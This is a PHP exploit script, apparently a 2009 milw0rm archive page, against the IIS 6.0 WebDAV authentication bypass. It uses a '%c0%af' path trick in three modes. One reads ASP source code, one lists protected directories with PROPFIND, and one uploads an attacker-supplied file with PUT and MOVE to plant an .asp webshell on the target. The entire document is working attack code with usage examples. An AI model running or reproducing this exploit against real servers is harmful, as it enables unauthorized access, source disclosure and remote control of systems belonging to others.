<html><head><title>Microsoft IIS 6.0 WebDAV Remote Authentication Bypass Exploit (php)</title></head><pre>&lt;?

print_r('
********  IIS 6 WEBDAV Exploit.By racle@tian6.com &amp;&amp; Securiteweb.org  ********
                                                         
       Usage: php '.$argv[0].' source/path/put host path    
       Example: php '.$argv[0].' source www.tian6.com /blog/readme.asp        
       Example2: php '.$argv[0].' path www.tian6.com /secret/
       Example3: php '.$argv[0].' put www.tian6.com /secret/ test.txt(evil code as test.txt)
****************************************************************
');

//verification du debut
if($argv[1]!=&quot;source&quot;&amp;&amp;$argv[1]!=&quot;path&quot;&amp;&amp;$argv[1]!=&quot;put&quot;){echo &quot;Choose a action,source or path or put.&quot;;die;}
else {$action=$argv[1];}

if(stristr($argv[2],&quot;http://&quot;)){echo &quot;No http:// in the host!&quot;;die;}
else{$host=$argv[2];}

if(stristr($argv[3],&quot;/&quot;)==false){echo &quot;Where is the / ?&quot;;die;}
else{$path=$argv[3];}


//sent
function sent($sock)   
{   
global  $host, $html;   
$ock=fsockopen(gethostbyname($host),'80');   
if (!$ock) {   
echo 'No response from '.$host; die;   
}   
fputs($ock,$sock);   
$html='';   
while (!feof($ock)) {   
$html.=fgets($ock);   
}   
fclose($ock);   
}   

if($action==&quot;source&quot;){
	$position=strrpos($path,&quot;/&quot;);
    $path=substr_replace($path,&quot;%c0%af/&quot;,$position,1);
	$sock=&quot;GET &quot;.$path.&quot; HTTP/1.1\r\n&quot;;
    $sock.=&quot;Translate: f\r\n&quot;;
	$sock.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
    $sock.=&quot;Connection:close\r\n\r\n&quot;;
	sent($sock);
	echo $html;
	die;
	}


if($action==&quot;path&quot;){
	$position=strrpos($path,&quot;/&quot;);
    $path=substr_replace($path,&quot;%c0%af&quot;,$position,0);
	$sock=&quot;PROPFIND  &quot;.$path.&quot; HTTP/1.1\r\n&quot;;
	$sock.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
    $sock.=&quot;Connection:close\r\n&quot;;
	$sock.='Content-Type: text/xml; charset=&quot;utf-8&quot;'.&quot;\r\n&quot;;
	$sock.=&quot;Content-Length: 0\r\n\r\n&quot;;
    $sock.='&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;D:propfind xmlns:D=&quot;DAV:&quot;&gt;&lt;D:prop xmlns:R=&quot;http://www.foo.bar/boxschema/&quot;&gt;&lt;R:bigbox/&gt;&lt;R:author/&gt;&lt;R:DingALing/&gt;&lt;R:Random/&gt;&lt;/D:prop&gt;&lt;/D:propfind&gt;';
    sent($sock);
	$bur=explode(&quot;&lt;a:href&gt;&quot;,$html);
    foreach($bur as $line){$no=strpos($line,&quot;&lt;&quot;);$resultat.=substr($line,0,$no).&quot;\n&quot;;}
    echo $resultat;
	die;
    }


if($action==&quot;put&quot;){
	echo &quot;Remember,keep urfile in type txt!\r\n\r\n&quot;;
     $fp = fopen(&quot;test.txt&quot;, 'r');
	 if($fp!=false){
     while (false!==($char = fgets($fp))) {
     $fir1 .= $char;    # fix: hoahongtim Team: hvaonline.net
     }
     fclose($fp);
	$position=strrpos($path,&quot;/&quot;);
    $path=substr_replace($path,&quot;%c0%af&quot;,$position,0);
    $sock=&quot;PUT &quot;.$path.&quot;test.txt HTTP/1.1\r\n&quot;;
	$sock.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
	$sock.='Content-Type: text/xml; charset=&quot;utf-8&quot;'.&quot;\r\n&quot;;
	$sock.=&quot;Connection:close\r\n&quot;;
	$sock.=&quot;Content-Length: &quot;.strlen($fir1).&quot;\r\n\r\n&quot;;
    $sock.=&quot;&quot;.$fir1.&quot;\r\n&quot;;
   	echo $sock; sent($sock);sleep(2);
	$sock=&quot;MOVE &quot;.$path.&quot;test.txt HTTP/1.1\r\n&quot;;
    $sock.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
    $sock.=&quot;Connection:close\r\n&quot;;
	$sock.=&quot;Destination: &quot;.$path.&quot;racle.asp\n\n&quot;;
    sent($sock);
	echo &quot;Be cool,man! Webshell is http://&quot;.$host.$path.&quot;racle.asp&quot;;
	die;}
	else{die;}
	}

# milw0rm.com [2009-05-22]</pre></html>